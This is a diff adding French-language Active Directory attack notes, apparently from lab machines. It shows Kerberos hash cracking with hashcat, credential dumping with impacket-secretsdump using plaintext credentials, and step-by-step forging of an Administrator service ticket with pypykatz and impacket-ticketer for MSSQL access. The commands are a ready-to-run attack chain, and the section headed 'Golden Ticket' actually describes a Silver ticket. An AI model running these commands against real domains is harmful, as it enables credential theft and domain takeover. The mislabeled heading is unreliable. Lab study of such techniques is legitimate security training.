@@ -96,5 +96,26 @@ hashcat -m 13100 -a 0 hash_file.txt /usr/share/wordlists/rockyou.txt
 impacket-secretsdump 'administration.htb'/'ethan':'limpbizkit'@'10.129.41.21
 ```
 
+## Golden Ticket
+Pour créer un Silver ticket il faut : 
+1. NTLM Hash du mot de passe du compte de service
+2. Le SID du domaine
 
 
+#### 1. Obtenir le Hash d'un mot de passe
+```bash
+# MDP :  Trustno1
+# SID :  S-1-5-21-2330692793-3312915120-706255856
+pypykatz crypto nt Trustno1
+```
+#### 2. Forger un ticket pour le user Administrator
+```bash
+impacket-ticketer -spn MSSQLSvc/breachdc.breach.vl -domain-sid S-1-5-21-2330692793-3312915120-706255856 -nthash 69596c7aa1e8daee17f8e78870e25a5c -dc-ip 10.129.44.190 -domain breach.vl -user-id 500 Administrator
+```
+![alt text]()
+#### 3.  Se connecter avec le ticket forger 
+```bash
+export KRB5CCNAME=Administrator.ccache
+impacket-mssqlclient -k -no-pass -windows-auth breachdc.breach.vl
+```
+![alt text]()
